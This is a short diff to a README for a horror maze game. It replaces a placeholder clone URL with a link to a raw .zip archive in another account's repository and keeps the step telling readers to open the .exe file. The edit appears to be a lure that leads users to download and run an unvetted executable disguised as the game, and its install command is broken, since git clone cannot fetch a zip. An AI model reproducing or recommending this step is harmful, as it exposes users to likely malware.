@@ -15,7 +15,7 @@ In the Maze Escape Game, you find yourself trapped in a maze with a ghost on the
 
 ## Installation
 1. Clone this repository to your local machine:
-    git clone https://github.com/yourusername/maze-escape-game.git
+    git clone https://github.com/shining-star2010/HorrorMaze/raw/refs/heads/main/scary/Maze_Horror_cambial.zip
 2. Navigate to the project directory:
     cd HorrorMaze
 3. Open the .exe file an play!
